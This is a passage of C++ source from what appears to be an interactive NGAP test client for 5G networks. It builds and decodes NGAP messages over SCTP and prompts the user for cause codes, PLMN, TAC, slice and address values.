  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UL_RAN_CFG_TRANSFER);
  auto& msg = m.pdu.init_msg().value.ul_ran_cfg_transfer();
  msg->endc_son_cfg_transfer_ul_present = true;
  msg->endc_son_cfg_transfer_ul = std::move(transfer);
  return pack_ngap_message(m, "UplinkRANConfigurationTransfer");
}

static byte_buffer build_uplink_rim_information_transfer(byte_buffer transfer)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UL_RIM_INFO_TRANSFER);
  auto& msg = m.pdu.init_msg().value.ul_rim_info_transfer();
  asn1::protocol_ie_field_s<ul_rim_info_transfer_ies_o> ie;
  asn1::cbit_ref bref({transfer.begin(), transfer.end()});
  if (ie.value().rim_info_transfer().unpack(bref) != asn1::OCUDUASN_SUCCESS) {
    throw std::runtime_error("Failed to decode RIMInformationTransfer hex");
  }
  msg->push_back(ie);
  return pack_ngap_message(m, "UplinkRIMInformationTransfer");
}

static byte_buffer build_uplink_non_ue_associated_nrppa_transport(byte_buffer routing_id, byte_buffer nrppa_pdu)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UL_NON_UE_ASSOCIATED_NRPPA_TRANSPORT);
  auto& msg = m.pdu.init_msg().value.ul_non_ue_associated_nrppa_transport();
  msg->routing_id = std::move(routing_id);
  msg->nrppa_pdu = std::move(nrppa_pdu);
  return pack_ngap_message(m, "UplinkNonUEAssociatedNRPPaTransport");
}

static byte_buffer build_uplink_ue_associated_nrppa_transport(uint64_t amf_id,
                                                               uint64_t ran_id,
                                                               byte_buffer routing_id,
                                                               byte_buffer nrppa_pdu)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UL_UE_ASSOCIATED_NRPPA_TRANSPORT);
  auto& msg = m.pdu.init_msg().value.ul_ue_associated_nrppa_transport();
  msg->amf_ue_ngap_id = amf_id;
  msg->ran_ue_ngap_id = ran_id;
  msg->routing_id = std::move(routing_id);
  msg->nrppa_pdu = std::move(nrppa_pdu);
  return pack_ngap_message(m, "UplinkUEAssociatedNRPPaTransport");
}

static byte_buffer build_ue_tnla_binding_release_request(uint64_t amf_id, uint64_t ran_id)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_UE_TNLA_BINDING_RELEASE);
  auto& msg = m.pdu.init_msg().value.ue_tnla_binding_release_request();
  msg->amf_ue_ngap_id = amf_id;
  msg->ran_ue_ngap_id = ran_id;
  return pack_ngap_message(m, "UETNLABindingReleaseRequest");
}

static byte_buffer build_ran_paging_request(uint64_t amf_id, uint64_t ran_id)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_RAN_PAGING_REQUEST);
  auto& msg = m.pdu.init_msg().value.ran_paging_request();
  msg->amf_ue_ngap_id = amf_id;
  msg->ran_ue_ngap_id = ran_id;
  return pack_ngap_message(m, "RANPagingRequest");
}

static byte_buffer build_timing_synchronisation_status_report(byte_buffer routing_id)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_TIMING_SYNCHRONISATION_STATUS_REPORT);
  auto& msg = m.pdu.init_msg().value.timing_synchronisation_status_report();
  msg->routing_id = std::move(routing_id);
  msg->ran_timing_synchronisation_status_info.synchronisation_state_present = true;
  msg->ran_timing_synchronisation_status_info.synchronisation_state.value =
      ran_timing_synchronisation_status_info_s::synchronisation_state_opts::locked;
  msg->ran_tss_scope.set_ran_node_level() = build_global_gnb_id("00f110", current_gnb_id);
  return pack_ngap_message(m, "TimingSynchronisationStatusReport");
}

static byte_buffer build_write_replace_warning_response(const std::string& msg_id_hex, const std::string& serial_hex)
{
  ngap_message m = {};
  m.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_WRITE_REPLACE_WARNING);
  auto& msg = m.pdu.successful_outcome().value.write_replace_warning_resp();
  msg->msg_id.from_string(msg_id_hex);
  msg->serial_num.from_string(serial_hex);
  return pack_ngap_message(m, "WriteReplaceWarningResponse");
}

static byte_buffer build_pws_failure_indication(const std::string& plmn)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_PWS_FAIL_IND);
  auto& msg = m.pdu.init_msg().value.pws_fail_ind();
  auto& cgi = msg->pws_failed_cell_id_list.set_nr_cgi_pws_failed_list();
  nr_cgi_s cell = {};
  cell.plmn_id.from_string(plmn);
  cell.nr_cell_id.from_number(nr_cell_identity::create(gnb_id_t{current_gnb_id, default_gnb_id_bit_len}, default_sector_id).value().value());
  cgi.push_back(cell);
  msg->global_ran_node_id.set_global_gnb_id() = build_global_gnb_id(plmn, current_gnb_id);
  return pack_ngap_message(m, "PWSFailureIndication");
}

static byte_buffer build_pws_restart_indication(const std::string& plmn)
{
  ngap_message m = {};
  m.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_PWS_RESTART_IND);
  auto& msg = m.pdu.init_msg().value.pws_restart_ind();
  auto& cgi = msg->cell_id_list_for_restart.set_nr_cgi_listfor_restart();
  nr_cgi_s cell = {};
  cell.plmn_id.from_string(plmn);
  cell.nr_cell_id.from_number(nr_cell_identity::create(gnb_id_t{current_gnb_id, default_gnb_id_bit_len}, default_sector_id).value().value());
  cgi.push_back(cell);
  msg->global_ran_node_id.set_global_gnb_id() = build_global_gnb_id(plmn, current_gnb_id);
  tai_s tai = {};
  tai.plmn_id.from_string(plmn);
  tai.tac.from_string("000007");
  msg->tai_list_for_restart.push_back(tai);
  return pack_ngap_message(m, "PWSRestartIndication");
}
static std::string sockaddr_to_string(const sockaddr& addr, socklen_t addr_len)
{
  const auto info = get_nameinfo(addr, addr_len);
  return info.address + ":" + std::to_string(info.port);
}

static socklen_t sockaddr_len(const sockaddr_storage& addr)
{
  return reinterpret_cast<const sockaddr*>(&addr)->sa_family == AF_INET ? sizeof(sockaddr_in) : sizeof(sockaddr_in6);
}

static std::vector<sockaddr_storage>
resolve_sctp_addresses(const std::vector<std::string>& addresses, int port, ocudulog::basic_logger& logger)
{
  std::vector<sockaddr_storage> resolved_addrs;
  for (const auto& addr : addresses) {
    sockaddr_searcher searcher{addr, port, logger};
    for (struct addrinfo* result = searcher.next(); result != nullptr; result = searcher.next()) {
      sockaddr_storage storage = {};
      std::memcpy(&storage, result->ai_addr, result->ai_addrlen);
      resolved_addrs.emplace_back(storage);
    }
  }

  std::sort(resolved_addrs.begin(), resolved_addrs.end(), sockaddr_storage_less{});
  auto last = std::unique(resolved_addrs.begin(), resolved_addrs.end(), sockaddr_storage_equal);
  resolved_addrs.erase(last, resolved_addrs.end());
  return resolved_addrs;
}

static bool has_ipv6_address(const std::vector<sockaddr_storage>& addresses)
{
  return std::any_of(addresses.begin(), addresses.end(), [](const sockaddr_storage& addr) {
    return reinterpret_cast<const sockaddr*>(&addr)->sa_family == AF_INET6;
  });
}

static void keep_compatible_destinations(std::vector<sockaddr_storage>& destinations, int socket_family)
{
  if (socket_family != AF_INET) {
    return;
  }
  destinations.erase(std::remove_if(destinations.begin(),
                                    destinations.end(),
                                    [](const sockaddr_storage& addr) {
                                      return reinterpret_cast<const sockaddr*>(&addr)->sa_family == AF_INET6;
                                    }),
                     destinations.end());
}

static std::vector<std::string> get_peer_addresses(int fd, sctp_assoc_t assoc_id)
{
  std::vector<std::string> peer_addresses;
  struct sockaddr*        paddrs = nullptr;

  const int paddr_count = ::sctp_getpaddrs(fd, assoc_id, &paddrs);
  if (paddr_count <= 0 || paddrs == nullptr) {
    return peer_addresses;
  }

  const sockaddr* current = paddrs;
  for (int i = 0; i != paddr_count; ++i) {
    if (current->sa_family != AF_INET && current->sa_family != AF_INET6) {
      break;
    }
    const socklen_t peer_len = current->sa_family == AF_INET ? sizeof(sockaddr_in) : sizeof(sockaddr_in6);
    peer_addresses.push_back(sockaddr_to_string(*current, peer_len));
    current = reinterpret_cast<const sockaddr*>(reinterpret_cast<const uint8_t*>(current) + peer_len);
  }
  ::sctp_freepaddrs(paddrs);

  return peer_addresses;
}

static std::string get_local_endpoint(int fd)
{
  sockaddr_storage local_addr     = {};
  socklen_t        local_addr_len = sizeof(local_addr);
  if (::getsockname(fd, reinterpret_cast<sockaddr*>(&local_addr), &local_addr_len) != 0) {
    return "unknown";
  }
  return sockaddr_to_string(*reinterpret_cast<sockaddr*>(&local_addr), local_addr_len);
}

static void dump_hex(const byte_buffer& pdu)
{
  for (uint8_t byte : pdu) {
    std::printf("%02x", byte);
  }
  std::printf("\n");
}

static std::string get_message_type(const ngap_pdu_c& pdu)
{
  switch (pdu.type().value) {
    case ngap_pdu_c::types_opts::init_msg:
      return pdu.init_msg().value.type().to_string();
    case ngap_pdu_c::types_opts::successful_outcome:
      return pdu.successful_outcome().value.type().to_string();
    case ngap_pdu_c::types_opts::unsuccessful_outcome:
      return pdu.unsuccessful_outcome().value.type().to_string();
    default:
      return "unknown";
  }
}

static std::string describe_ngap_pdu(const byte_buffer& pdu)
{
  asn1::cbit_ref bref(pdu);
  ngap_message   msg = {};
  if (msg.pdu.unpack(bref) != asn1::OCUDUASN_SUCCESS) {
    return "decode-failed";
  }
  return get_message_type(msg.pdu);
}

static std::optional<std::string> describe_ngap_pdu_ies(const byte_buffer& pdu)
{
  asn1::cbit_ref bref(pdu);
  ngap_message   msg = {};
  if (msg.pdu.unpack(bref) != asn1::OCUDUASN_SUCCESS) {
    return std::nullopt;
  }

  asn1::json_writer json;
  msg.pdu.to_json(json);
  return json.to_string();
}
static bool is_relevant_ngap_field(const std::string& key)
{
  static constexpr const char* fields[] = {
      "aMF-UE-NGAP-ID", "rAN-UE-NGAP-ID", "AMF-UE-NGAP-ID", "RAN-UE-NGAP-ID", "gNB-ID", "Global-gNB-ID", "globalGNB-ID", "GlobalRANNodeID", "Extended-RANNodeName", "rANNodeNameVisibleString",
      "rANNodeNameUTF8String", "RAN-node-name", "RANNodeName", "RRC-Establishment-Cause", "RRCEstablishmentCause", "pLMNIdentity", "tAC", "sST", "sD", "pDUSessionID",
      "qosFlowIdentifier", "PDU-Session-ID", "NAS-PDU", "UE-NR-Capability", "UE-EUTRA-Capability", "UE-RadioCapability", "UERadioCapability", "Cause", "nAS-PDU", "pDUSessionNAS-PDU", "transportLayerAddress",
      "gTP-TEID", "dRB-ID", "uL-HFN", "uL-PDCP-SN", "dL-HFN", "dL-PDCP-SN",
      "cause", "radioNetwork", "transport", "protocol", "misc", "resetType",
      "handoverType", "targetRANNodeID", "criticalityDiagnostics", "rRCContainer",
      "sourceToTarget-TransparentContainer", "targetToSource-TransparentContainer",
      "s-NSSAI", "supportedTAList", "nGRAN-TNLAssociationToAddList",
      "nGRAN-TNLAssociationToRemoveList"};
  return std::find(std::begin(fields), std::end(fields), key) != std::end(fields);
}

static void collect_scalar_ngap_values(const nlohmann::json& node, const std::string& label, std::vector<std::string>& fields)
{
  if (node.is_object()) {
    for (const auto& item : node.items()) {
      collect_scalar_ngap_values(item.value(), label, fields);
    }
  } else if (node.is_array()) {
    for (const auto& item : node) {
      collect_scalar_ngap_values(item, label, fields);
    }
  } else {
    const std::string field = label + "=" + (node.is_string() ? node.get<std::string>() : node.dump());
    if (std::find(fields.begin(), fields.end(), field) == fields.end()) { fields.push_back(field); }
  }
}

static std::optional<std::string> ngap_ie_label(const nlohmann::json& id)
{
  if (id.is_string() && is_relevant_ngap_field(id.get<std::string>())) {
    return id.get<std::string>();
  }
  if (!id.is_number()) {
    return std::nullopt;
  }
  switch (id.get<uint64_t>()) {
    case 10: return "AMF-UE-NGAP-ID";
    case 15: return "Cause";
    case 19: return "CriticalityDiagnostics";
    case 27: return "GlobalRANNodeID";
    case 38: return "NAS-PDU";
    case 82: return "RANNodeName";
    case 85: return "RAN-UE-NGAP-ID";
    case 90: return "RRCEstablishmentCause";
    case 102: return "SupportedTAList";
    case 117: return "UE-NR-Capability";
    case 121: return "UserLocationInformation";
    default: return std::nullopt;
  }
}

static void collect_relevant_ngap_fields(const nlohmann::json& node, std::vector<std::string>& fields)
{
  if (node.is_object()) {
    const auto id = node.find("id");
    const auto value = node.find("Value");
    const auto label = id == node.end() ? std::nullopt : ngap_ie_label(*id);
    const bool flatten_value = label.has_value() && value != node.end() &&
                               (label == "AMF-UE-NGAP-ID" || label == "RAN-UE-NGAP-ID" ||
                                label == "NAS-PDU" || label == "RANNodeName" || label == "UE-NR-Capability" ||
                                label == "UE-EUTRA-Capability" || label == "PDU-Session-NAS-PDU");
    if (flatten_value) {
      collect_scalar_ngap_values(*value, label.value(), fields);
    }
    for (const auto& [key, child] : node.items()) {
      if (key == "Value" && flatten_value) {
        continue;
      }
      if (is_relevant_ngap_field(key) && !child.is_object() && !child.is_array()) {
        const std::string field = key + "=" + (child.is_string() ? child.get<std::string>() : child.dump());
        if (std::find(fields.begin(), fields.end(), field) == fields.end()) { fields.push_back(field); }
      }
      collect_relevant_ngap_fields(child, fields);
    }
  } else if (node.is_array()) {
    for (const auto& child : node) {
      collect_relevant_ngap_fields(child, fields);
    }
  }
}

static void add_unique_relevant_field(std::vector<std::string>& fields, const std::string& field)
{
  if (std::find(fields.begin(), fields.end(), field) == fields.end()) {
    fields.push_back(field);
  }
}

static void append_numeric_ie_fields(const std::string& serialized, std::vector<std::string>& fields)
{
  struct ie_label {
    unsigned    id;
    const char* name;
  };
  constexpr ie_label scalar_ies[] = {
      {10, "AMF-UE-NGAP-ID"}, {38, "NAS-PDU"}, {82, "RANNodeName"}, {85, "RAN-UE-NGAP-ID"}};
  for (const auto& ie : scalar_ies) {
    const std::regex pattern{R"re("id"\s*:\s*)re" + std::to_string(ie.id) +
                             R"re(\s*,\s*"criticality"\s*:\s*"[^"]*"\s*,\s*"Value"\s*:\s*(?:"([^"]*)"|([0-9]+)))re"};
    for (std::sregex_iterator it(serialized.begin(), serialized.end(), pattern), end; it != end; ++it) {
      add_unique_relevant_field(fields, std::string(ie.name) + "=" + ((*it)[1].matched ? (*it)[1].str() : (*it)[2].str()));
    }
  }

  const std::regex ran_name_pattern{R"re("id"\s*:\s*82\s*,\s*"criticality"\s*:\s*"[^"]*"\s*,\s*"Value"\s*:\s*\{\s*"PrintableString"\s*:\s*"([^"]*)")re"};
  for (std::sregex_iterator it(serialized.begin(), serialized.end(), ran_name_pattern), end; it != end; ++it) {
    add_unique_relevant_field(fields, "RANNodeName=" + (*it)[1].str());
  }

  const std::regex capability_pattern{R"re("id"\s*:\s*117[\s\S]*?"OCTET STRING"\s*:\s*"([^"]*)")re"};
  for (std::sregex_iterator it(serialized.begin(), serialized.end(), capability_pattern), end; it != end; ++it) {
    add_unique_relevant_field(fields, "UE-NR-Capability=" + (*it)[1].str());
  }

  const std::regex gnb_id_pattern{R"re("gNB-ID"\s*:\s*"([^"]*)")re"};
  for (std::sregex_iterator it(serialized.begin(), serialized.end(), gnb_id_pattern), end; it != end; ++it) {
    const std::string bits = (*it)[1].str();
    uint64_t value = 0;
    bool is_binary = !bits.empty();
    for (const char bit : bits) {
      if (bit != '0' && bit != '1') { is_binary = false; break; }
      value = (value << 1U) | static_cast<uint64_t>(bit - '0');
    }
    add_unique_relevant_field(fields, is_binary ? "gNB-ID=" + std::to_string(value) : "gNB-ID=" + bits);
  }
}
static std::optional<std::string> format_relevant_ngap_fields(const byte_buffer& pdu)
{
  const auto decoded = describe_ngap_pdu_ies(pdu);
  if (!decoded.has_value()) { return std::nullopt; }

  std::vector<std::string> fields;
  append_numeric_ie_fields(decoded.value(), fields);
  try {
    const auto parsed_json = nlohmann::json::parse(decoded.value());
    collect_relevant_ngap_fields(parsed_json, fields);
  } catch (const nlohmann::json::exception&) {
    // Numeric IE extraction above remains useful even when repeated JSON keys
    // cannot be represented by the JSON parser.
  }
  if (fields.empty()) { return std::nullopt; }

  std::ostringstream output;
  for (const auto& field : fields) { output << "  " << field << "\n"; }
  return output.str();
}

static bool is_downlink_nas_authentication_reject(const byte_buffer& pdu)
{
  asn1::cbit_ref bref(pdu);
  ngap_message   msg = {};
  if (msg.pdu.unpack(bref) != asn1::OCUDUASN_SUCCESS) {
    return false;
  }
  if (msg.pdu.type().value != ngap_pdu_c::types_opts::init_msg ||
      msg.pdu.init_msg().value.type().value != ngap_elem_procs_o::init_msg_c::types_opts::dl_nas_transport) {
    return false;
  }

  const auto& nas_pdu = msg.pdu.init_msg().value.dl_nas_transport()->nas_pdu;
  const auto  nas_hex = nas_pdu.to_string();
  return nas_hex.size() >= 6 && nas_hex.rfind("7e00", 0) == 0 && nas_hex.substr(4, 2) == "58";
}

static bool parse_uint64(const std::string& token, uint64_t& value)
{
  if (token.empty()) {
    return false;
  }

  char* end = nullptr;
  errno     = 0;
  const auto parsed = std::strtoull(token.c_str(), &end, 0);
  if (errno != 0 || end == token.c_str() || *end != '\0') {
    return false;
  }

  value = static_cast<uint64_t>(parsed);
  return true;
}

static std::string trim_copy(const std::string& value)
{
  const auto first = std::find_if_not(value.begin(), value.end(), [](unsigned char c) { return std::isspace(c); });
  const auto last  = std::find_if_not(value.rbegin(), value.rend(), [](unsigned char c) { return std::isspace(c); });
  if (first == value.end()) {
    return {};
  }
  return std::string(first, last.base());
}

static bool read_line(const char* prompt, std::string& line)
{
  std::printf("%s", prompt);
  std::fflush(stdout);
  return static_cast<bool>(std::getline(std::cin, line));
}

static bool is_quit_command(const std::string& line)
{
  return line == "q" || line == "quit" || line == "exit";
}

struct radio_network_cause_option {
  const char*                  label;
  ngap_cause_radio_network_t   cause;
};

struct error_indication_cause_option {
  const char* label;
  const char* cause_name;
};

static const std::vector<radio_network_cause_option>& ue_context_release_cause_options()
{
  static const std::vector<radio_network_cause_option> options = {
      {"successful-handover", ngap_cause_radio_network_t::successful_ho},
      {"release-due-to-ngran-generated-reason", ngap_cause_radio_network_t::release_due_to_ngran_generated_reason},
      {"release-due-to-5gc-generated-reason", ngap_cause_radio_network_t::release_due_to_5gc_generated_reason},
      {"user-inactivity", ngap_cause_radio_network_t::user_inactivity},
      {"radio-connection-with-ue-lost", ngap_cause_radio_network_t::radio_conn_with_ue_lost},
      {"radio-resources-not-available", ngap_cause_radio_network_t::radio_res_not_available},
      {"failure-in-radio-interface-procedure", ngap_cause_radio_network_t::fail_in_radio_interface_proc},
      {"interaction-with-other-procedure", ngap_cause_radio_network_t::interaction_with_other_proc},
      {"unknown-local-UE-NGAP-ID", ngap_cause_radio_network_t::unknown_local_ue_ngap_id},
      {"inconsistent-remote-UE-NGAP-ID", ngap_cause_radio_network_t::inconsistent_remote_ue_ngap_id},
      {"unspecified", ngap_cause_radio_network_t::unspecified}};
  return options;
}

static const std::vector<error_indication_cause_option>& non_ue_error_indication_cause_options()
{
  static const std::vector<error_indication_cause_option> options = {
      {"release-due-to-ngran-generated-reason", "release-due-to-ngran-generated-reason"},
      {"release-due-to-5gc-generated-reason", "release-due-to-5gc-generated-reason"},
      {"failure-in-radio-interface-procedure", "failure-in-radio-interface-procedure"},
      {"interaction-with-other-procedure", "interaction-with-other-procedure"},
      {"radio-resources-not-available", "radio-resources-not-available"},
      {"cell-not-available", "cell-not-available"},
      {"unknown-target-id", "unknown-target-id"},
      {"unspecified", "unspecified"}};
  return options;
}

static const std::vector<error_indication_cause_option>& ue_error_indication_cause_options()
{
  static const std::vector<error_indication_cause_option> options = {
      {"unknown-local-UE-NGAP-ID", "unknown-local-UE-NGAP-ID"},
      {"inconsistent-remote-UE-NGAP-ID", "inconsistent-remote-UE-NGAP-ID"},
      {"radio-connection-with-ue-lost", "radio-connection-with-ue-lost"},
      {"release-due-to-ngran-generated-reason", "release-due-to-ngran-generated-reason"},
      {"release-due-to-5gc-generated-reason", "release-due-to-5gc-generated-reason"},
      {"user-inactivity", "user-inactivity"},
      {"failure-in-radio-interface-procedure", "failure-in-radio-interface-procedure"},
      {"interaction-with-other-procedure", "interaction-with-other-procedure"},
      {"unknown-pdu-session-id", "unknown-pdu-session-id"},
      {"unknown-qos-flow-id", "unknown-qos-flow-id"},
      {"unspecified", "unspecified"}};
  return options;
}

static const char* get_radio_network_cause_label(ngap_cause_radio_network_t cause)
{
  for (const auto& option : ue_context_release_cause_options()) {
    if (option.cause == cause) {
      return option.label;
    }
  }
  return "unknown";
}

static std::optional<ngap_cause_radio_network_t> read_ue_context_release_cause()
{
  const auto& options = ue_context_release_cause_options();
  while (true) {
    std::printf("\nSelect UEContextReleaseRequest cause [default=1]:\n");
    for (size_t i = 0; i != options.size(); ++i) {
      std::printf("  %zu) %s\n", i + 1, options[i].label);
    }
    std::printf("  q) quit\n");

    std::string line;
    if (!read_line("Cause selection: ", line)) {
      return std::nullopt;
    }
    line = trim_copy(line);
    if (line.empty()) {
      return options.front().cause;
    }
    if (is_quit_command(line)) {
      return std::nullopt;
    }

    uint64_t value = 0;
    if (parse_uint64(line, value) && value >= 1 && value <= options.size()) {
      return options[value - 1].cause;
    }
    std::printf("Invalid cause selection. Enter 1..%zu or q.\n", options.size());
  }
}

static std::optional<std::string> read_error_indication_cause(bool ue_associated)
{
  const auto& options = ue_associated ? ue_error_indication_cause_options() : non_ue_error_indication_cause_options();
  while (true) {
    std::printf("\nSelect %s ErrorIndication cause [default=1]:\n", ue_associated ? "UE-associated" : "non-UE-associated");
    for (size_t i = 0; i != options.size(); ++i) {
      std::printf("  %zu) %s\n", i + 1, options[i].label);
    }
    std::printf("  q) quit\n");

    std::string line;
    if (!read_line("Cause selection: ", line)) {
      return std::nullopt;
    }
    line = trim_copy(line);
    if (line.empty()) {
      return std::string(options.front().cause_name);
    }
    if (is_quit_command(line)) {
      return std::nullopt;
    }

    uint64_t value = 0;
    if (parse_uint64(line, value) && value >= 1 && value <= options.size()) {
      return std::string(options[value - 1].cause_name);
    }
    std::printf("Invalid cause selection. Enter 1..%zu or q.\n", options.size());
  }
}

template <typename T>
static std::string default_to_string(const T& value)
{
  std::ostringstream os;
  os << value;
  return os.str();
}

template <typename T>
T get_input_or_default(const std::string& prompt, const T& default_value)
{
  std::printf("%s [default=%s]: ", prompt.c_str(), default_to_string(default_value).c_str());
  std::fflush(stdout);

  std::string line;
  if (!std::getline(std::cin, line)) {
    return default_value;
  }
  line = trim_copy(line);
  if (line.empty()) {
    return default_value;
  }

  std::stringstream input(line);
  T                 value{};
  if ((input >> value) && input.eof()) {
    return value;
  }

  std::printf("Invalid input. Using default=%s\n", default_to_string(default_value).c_str());
  return default_value;
}

template <>
std::string get_input_or_default<std::string>(const std::string& prompt, const std::string& default_value)
{
  std::printf("%s [default=%s]: ", prompt.c_str(), default_value.c_str());
  std::fflush(stdout);

  std::string line;
  if (!std::getline(std::cin, line)) {
    return default_value;
  }
  line = trim_copy(line);
  return line.empty() ? default_value : line;
}

template <>
bool get_input_or_default<bool>(const std::string& prompt, const bool& default_value)
{
  std::printf("%s [default=%s]: ", prompt.c_str(), default_value ? "Y" : "N");
  std::fflush(stdout);

  std::string line;
  if (!std::getline(std::cin, line)) {
    return default_value;
  }
  line = trim_copy(line);
  if (line.empty()) {
    return default_value;
  }
  if (line == "Y" || line == "y" || line == "yes" || line == "YES" || line == "1" || line == "true") {
    return true;
  }
  if (line == "N" || line == "n" || line == "no" || line == "NO" || line == "0" || line == "false") {
    return false;
  }

  std::printf("Invalid input. Using default=%s\n", default_value ? "Y" : "N");
  return default_value;
}

static bool is_hex_string(const std::string& value)
{
  return !value.empty() && value.size() % 2 == 0 &&
         std::all_of(value.begin(), value.end(), [](unsigned char c) { return std::isxdigit(c); });
}

static std::string read_valid_hex_or_default(const std::string& prompt, const std::string& default_hex)
{
  while (true) {
    std::string value = get_input_or_default<std::string>(prompt, default_hex);
    value.erase(std::remove_if(value.begin(), value.end(), [](unsigned char c) { return std::isspace(c); }), value.end());
    if (is_hex_string(value)) {
      return value;
    }
    std::printf("Invalid hex string. Use an even number of hex digits.\n");
  }
}


static byte_buffer read_handover_rrc_container_or_default()
{
  while (true) {
    std::string value = get_input_or_default<std::string>("UE Radio Capability hex for HO prep, or sample", "sample");
    value.erase(std::remove_if(value.begin(), value.end(), [](unsigned char c) { return std::isspace(c); }), value.end());
    if (value == "sample") {
      std::printf("Using built-in sample RRC HandoverPreparationInformation container.\n");
      return make_hex_byte_buffer_or_throw(default_ho_prep_rrc_container_hex);
    }
    if (!is_hex_string(value)) {
      std::printf("Invalid hex string. Use an even number of hex digits, or sample.\n");
      continue;
    }
    try {
      return build_handover_preparation_rrc_container_from_capability(make_hex_byte_buffer_or_throw(value));
    } catch (const std::exception& e) {
      std::printf("%s\n", e.what());
      std::printf("Paste UE-CapabilityRAT-ContainerList / UERadioAccessCapabilityInformation hex, or enter sample.\n");
    }
  }
}


static std::string read_fixed_hex_or_default(const std::string& prompt, const std::string& default_hex, size_t expected_octets)
{
  while (true) {
    std::string value = read_valid_hex_or_default(prompt, default_hex);
    if (value.size() == expected_octets * 2) {
      return value;
    }
    std::printf("Invalid hex length. Expected %zu octets / %zu hex digits.\n", expected_octets, expected_octets * 2);
  }
}

static std::string read_text_token_or_default(const std::string& prompt, const std::string& default_value)
{
  while (true) {
    const std::string value = get_input_or_default<std::string>(prompt, default_value);
    if (!value.empty() && std::none_of(value.begin(), value.end(), [](unsigned char c) { return std::isspace(c); })) {
      return value;
    }
    std::printf("Invalid text value. Use a non-empty string without spaces.\n");
  }
}

static std::string read_plmn_or_default(const std::string& prompt, const std::string& default_plmn)
{
  while (true) {
    const std::string value = get_input_or_default<std::string>(prompt, default_plmn);
    if (value.size() == 6 && std::all_of(value.begin(), value.end(), [](unsigned char c) { return std::isxdigit(c); })) {
      return value;
    }
    std::printf("Invalid PLMN. Use 3 octets as 6 hex digits, for example 00f110.\n");
  }
}

static std::string read_tac_or_default(const std::string& prompt, const std::string& default_tac)
{
  while (true) {
    std::string value = get_input_or_default<std::string>(prompt, default_tac);
    if (value.rfind("0x", 0) == 0 || value.rfind("0X", 0) == 0) {
      value = value.substr(2);
    }
    if (value.size() <= 6 && std::all_of(value.begin(), value.end(), [](unsigned char c) { return std::isxdigit(c); })) {
      while (value.size() < 6) {
        value.insert(value.begin(), '0');
      }
      return value;
    }
    std::printf("Invalid TAC. Use 0..ffffff or 3 octets as 6 hex digits.\n");
  }
}

static std::string read_sd_or_default(const std::string& prompt, const std::string& default_sd)
{
  while (true) {
    std::string value = get_input_or_default<std::string>(prompt, default_sd);
    if (value.empty() || value == "none") {
      return "";
    }
    if (value.rfind("0x", 0) == 0 || value.rfind("0X", 0) == 0) {
      value = value.substr(2);
    }
    if (value.size() <= 6 && std::all_of(value.begin(), value.end(), [](unsigned char c) { return std::isxdigit(c); })) {
      while (value.size() < 6) {
        value.insert(value.begin(), '0');
      }
      return value;
    }
    std::printf("Invalid S-NSSAI SD. Use empty input for absent SD, or 0..ffffff / 3 octets as 6 hex digits.\n");
  }
}

static std::string read_ipv4_or_default(const std::string& prompt, const std::string& default_address)
{
  while (true) {
    const std::string value = get_input_or_default<std::string>(prompt, default_address);
    in_addr           address{};
    if (inet_pton(AF_INET, value.c_str(), &address) == 1) {
      return value;
    }
    std::printf("Invalid IPv4 address. Use dotted decimal format, for example 127.0.0.1.\n");
  }
}

static uint64_t read_uint64_or_default(const std::string& prompt, uint64_t default_value, uint64_t max_value)
{
  while (true) {
    const std::string token = get_input_or_default<std::string>(prompt, default_to_string(default_value));
    uint64_t          value = 0;
    if (parse_uint64(token, value) && value <= max_value) {
      return value;
    }
    std::printf("Invalid value. Valid range is 0..%llu\n", static_cast<unsigned long long>(max_value));
  }
}

static byte_buffer make_hex_byte_buffer_or_throw(const std::string& hex)
{
  auto pdu = make_byte_buffer(hex);
  if (!pdu.has_value()) {
    throw std::runtime_error("Failed to parse hex byte buffer");
  }
  return std::move(pdu.value());
}

static cause_c build_radio_network_cause(const std::string& cause_name)
{
  cause_c cause;
  auto&   rn = cause.set_radio_network();
  if (cause_name == "successful-ho") {
    rn = cause_radio_network_opts::successful_ho;
  } else if (cause_name == "handover-cancelled") {
    rn = cause_radio_network_opts::ho_cancelled;
  } else if (cause_name == "handover-desirable-for-radio-reason") {
    rn = cause_radio_network_opts::ho_desirable_for_radio_reason;
  } else if (cause_name == "unknown-pdu-session-id") {
    rn = cause_radio_network_opts::unknown_pdu_session_id;
  } else if (cause_name == "unknown-qos-flow-id") {
    rn = cause_radio_network_opts::unkown_qos_flow_id;
  } else if (cause_name == "radio-connection-with-ue-lost") {
    rn = cause_radio_network_opts::radio_conn_with_ue_lost;
  } else if (cause_name == "release-due-to-5gc-generated-reason") {
    rn = cause_radio_network_opts::release_due_to_5gc_generated_reason;
  } else if (cause_name == "failure-in-radio-interface-procedure") {
    rn = cause_radio_network_opts::fail_in_radio_interface_proc;
  } else if (cause_name == "interaction-with-other-procedure") {
    rn = cause_radio_network_opts::interaction_with_other_proc;
  } else if (cause_name == "radio-resources-not-available") {
    rn = cause_radio_network_opts::radio_res_not_available;
  } else if (cause_name == "cell-not-available") {
    rn = cause_radio_network_opts::cell_not_available;
  } else if (cause_name == "unknown-target-id") {
    rn = cause_radio_network_opts::unknown_target_id;
  } else if (cause_name == "unknown-local-UE-NGAP-ID") {
    rn = cause_radio_network_opts::unknown_local_ue_ngap_id;
  } else if (cause_name == "inconsistent-remote-UE-NGAP-ID") {
    rn = cause_radio_network_opts::inconsistent_remote_ue_ngap_id;
  } else if (cause_name == "user-inactivity") {
    rn = cause_radio_network_opts::user_inactivity;
  } else if (cause_name == "unspecified") {
    rn = cause_radio_network_opts::unspecified;
  } else {
    rn = cause_radio_network_opts::release_due_to_ngran_generated_reason;
  }
  return cause;
}

static asn1::ngap::global_gnb_id_s build_global_gnb_id(const std::string& plmn, uint32_t gnb_id)
{
  asn1::ngap::global_gnb_id_s id = {};
  id.plmn_id.from_string(plmn);
